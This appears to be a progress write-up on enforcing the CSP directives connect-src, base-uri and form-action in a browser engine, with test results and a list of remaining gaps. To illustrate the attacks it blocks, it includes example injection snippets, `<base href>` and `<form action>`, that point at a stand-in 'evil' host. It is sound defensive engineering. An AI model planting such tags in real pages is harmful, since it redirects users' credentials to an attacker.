# 📡 The Outbound Verdict — Quest #523

> **`connect-src`, `base-uri`, `form-action` — the three directives that decide
> where the data GOES.**
> Script that is already running cannot be un-run. It still has to get what it
> stole off the machine, and it still has to send the password somewhere.

**Realm:** `content-security-policy/{connect-src,base-uri,form-action}` (49 files).
**Status:** ✅ landed.

---

## Why these three, together

`script-src` is about *what runs*. These three are about *what leaves*, and each
one closes a route that needs **no script running at the moment it is used**:

* **`connect-src`** — every road out: XHR, `fetch`, `sendBeacon`, EventSource,
  WebSocket. This is the directive that stops an injection **phoning home**.
* **`base-uri`** — **one injected tag re-points every relative URL on the page at
  once.** `<base href="//evil/">` needs no script and no network access of its
  own: from that line down, every relative `src`, `href` and form target belongs
  to somebody else. A policy that carefully enumerates script hosts and forgets
  this one has enumerated nothing.
* **`form-action`** — the directive that decides **where the password goes**. An
  injected `<form action="//evil/">`, or one line rewriting an existing form's
  `action`, sends the credentials the reader is about to type to somebody else,
  with no script running at submit time, on a page that still looks exactly like
  the real one. This is the difference between a defaced page and a stolen
  account.

All three parsed and **failed open** after #519.

## The work

Each is a two-line question asked at the seam the engine already owns — the value
of the whole quest is in *where* the seam is and *what the failure looks like*,
because a security check with the wrong failure mode is its own bug:

| directive | seam | failure |
|---|---|---|
| `connect-src` | `fetch()` after blob:/data: resolution | **reject `TypeError`** — a network error. It must not resolve with an error `Response`: a page that gets a `Response` back believes it reached the network. |
| `connect-src` | `XMLHttpRequest#send` (async) | **queued `error` event**, status 0. `send()` has already returned by the time the page hears, so the page hears through `onerror`, exactly as for a server that hung up. |
| `connect-src` | `XMLHttpRequest#_sendSync` | **throws `NetworkError`** — there is no later task in which to fire an event. |
| `connect-src` | `navigator.sendBeacon` | **returns `false`** — the caller is told the bytes are not queued, which is the whole contract of the method. |
| `connect-src` | `new EventSource` | constructor still returns an object; **fails the connection on a task**, so a listener attached on the next line still hears the `error`. |
| `base-uri` | `_documentBaseURL`, per `<base href>` | the tag is **ignored** and the document falls back to its own URL — what it would have used had the tag never existed. |
| `form-action` | `HTMLFormElement#submit`, after the resolved target URL | **the submission does not happen.** |

## Result

| file | before | after |
|---|---|---|
| `connect-src-xmlhttprequest-blocked.sub.html` | 0/1 | **1/1** ✅ |
| `connect-src-syncxmlhttprequest-blocked.sub.html` | 0/1 | **1/1** ✅ |
| `connect-src-beacon-blocked.sub.html` | 0/1 | **1/1** ✅ |
| `connect-src-eventsource-blocked.sub.html` | 0/1 | **1/1** ✅ |
| `connect-src-fetch-keepalive-blocked.sub.html` | 0/2 | **2/2** ✅ |
| `base-uri-deny.sub.html` | 0/2 | **2/2** ✅ |
| `base-uri-deny-url-encoded-host.sub.html` | 0/2 | **2/2** ✅ |
| `report-uri-does-not-respect-base-uri.sub.html` | 0/3 | **3/3** ✅ |
| `form-action-src-blocked.sub.html` | 0/1 | **1/1** ✅ |
| `form-action-src-get-blocked.sub.html` | 0/1 | **1/1** ✅ |
| every `-allowed` sibling measured | — | **held** |

## ⛔ Caps / Next

* The three `form-action-src-*-allowed` files fail for a reason that is **not
  CSP**: they submit a POST into a named `<iframe>` and wait for a `postMessage`
  from the loaded page. The frame loader has no request-body channel (a
  pre-existing cap, named in the form-submission work). The **blocked** siblings
  pass, which is what this quest is about.
* `base-uri-allow-leading-zero-port.sub.html` needs port normalisation
  (`:080` ≡ `:80`) in the source-expression matcher.
* `connect-src-fetch-keepalive-allowed` needs `fetch(..., {keepalive: true})` to
  actually deliver; the **blocked** half passes.
* WebSocket is **not** yet gated by `connect-src` — the one road out still open.
  Redirect-to-blocked variants (`*-redirect-to-blocked`) are unhandled: CSP
  re-checks at each redirect hop and our fetch does not surface them.
* `frame-src` / `child-src` / `object-src` / `media-src` / `font-src` /
  `worker-src` still parse and fail open.
